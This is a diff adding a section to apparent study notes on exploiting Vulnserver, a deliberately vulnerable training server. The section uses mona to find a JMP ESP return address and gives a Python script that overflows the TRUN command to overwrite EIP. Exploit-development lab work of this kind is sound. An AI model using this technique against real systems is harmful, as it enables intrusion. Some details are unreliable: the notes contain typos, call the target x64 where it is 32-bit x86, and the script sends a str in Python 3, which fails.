@@ -335,6 +335,94 @@ If anything is missing or wrong that is a bad character.
 Go through and note all the bad characters.
 Vulnserver only has the null byte as bad char.
 
+**Finding the Right Module**
+
+*Mona*
+
+ Download mona module
+
+ https://github.com/corelan/mona 
+
+ put mona.py into immunity debugger/PyCommands folder.
+
+ Search in Immunity Debugger
+
+    !mona modules
+
+Look in the module info table for all "false" entries. 
+And preferable it should be a dll also good if it runs with vulnserver
+
+ASLR would randomize the base address on every start on the system.
+
+    essfunc.ddl
+
+Go to Kali and look for the upcode equivalent (convert Assembly language in HEX Code)
+
+    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+    in Nasm shell:
+        JMP ESP 
+    gives you *FFE4*
+    (result is always the same)
+
+Go back to immunity debugger
+
+    !mona find -s "\xff\xe4" -m essfunc.dll
+
+    -s upcode equivialent 
+    -m module to use
+
+That gives you a list of possible return addresses 
+
+    0x625011af
+
+Back to Kali to write the actual expoit
+the address has to be written backwards (little indian)
+Because the low memory byte is stored in the lowest adress in x64 architecture and the high order byte is the highest address
+
+    #!/user/bin/python3
+    import socket
+
+    vulnserverHost = "192.168.178.60"
+    vulnserverDefaultPort = 9999
+    shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect = s.connect((vulnserverHost, vulnserverDefaultPort))
+        s.send(('TRUN /.:/' + shellcode))
+    except:
+        print("check debugger")
+    finally:
+        s.close()
+
+Back to Immunity Debugger we need to find the JMP ESP.
+
+    Click the Black Arrow with 4 dots and enter the address
+    625011af
+
+That should bring the FFE4 - JMP ESP. It is needed to test that.
+Select the live press F2 to create a Breakpoint in Immunity Debugger.
+Now try to run the module code in kali.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     
+
+
 
 
 
